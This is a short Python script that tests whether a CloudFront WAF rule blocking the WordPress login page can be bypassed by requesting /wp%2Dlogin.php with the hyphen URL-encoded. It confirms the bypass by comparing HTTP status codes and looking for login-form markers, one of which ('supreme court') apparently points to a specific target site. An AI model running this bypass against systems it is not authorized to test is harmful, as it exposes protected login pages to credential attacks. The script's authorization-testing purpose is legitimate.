#!/usr/bin/env python3
"""Read-only CloudFront WAF bypass check (GET only). Authorized targets only."""

from __future__ import annotations

import argparse
import sys

from http_client import request
from waf_bypass import resolve_login_path


def probe(base_url: str, bypass: str) -> tuple[int, int, str]:
    url = resolve_login_path(base_url, bypass=bypass)
    response = request("GET", url)
    snippet = response.text[:200].replace("\n", " ")
    return response.status_code, len(response.text), snippet


def main() -> int:
    parser = argparse.ArgumentParser(description="Verify wp-login WAF bypass (GET only)")
    parser.add_argument("-u", "--url", required=True, help="Base URL")
    args = parser.parse_args()

    print(f"[*] Target: {args.url}")
    print("[*] Probing /wp-login.php (expect 403 if WAF matches literal path)...")
    blocked_status, blocked_len, _ = probe(args.url, "none")
    print(f"    HTTP {blocked_status}, body length {blocked_len}")

    print("[*] Probing /wp%2Dlogin.php (CloudFront hyphen bypass)...")
    bypass_status, bypass_len, snippet = probe(args.url, "hyphen")
    print(f"    HTTP {bypass_status}, body length {bypass_len}")

    login_markers = ("wp-login", "user_login", "log in", "password", "wp-submit", "supreme court")
    has_form = any(m in snippet.lower() for m in login_markers) or bypass_len > 5000

    if blocked_status == 403 and bypass_status == 200 and has_form:
        print("[+] WAF BYPASS CONFIRMED: blocked path returns 403, bypass path serves login")
        return 0

    if blocked_status != 403:
        print("[!] Direct /wp-login.php was not blocked — WAF may be absent or misconfigured")
    if bypass_status != 200:
        print("[-] Bypass path did not return 200")
        return 1
    if not has_form:
        print("[!] Bypass returned 200 but response may not be the login form")
        return 1

    print("[+] Bypass path reachable")
    return 0


if __name__ == "__main__":
    sys.exit(main())
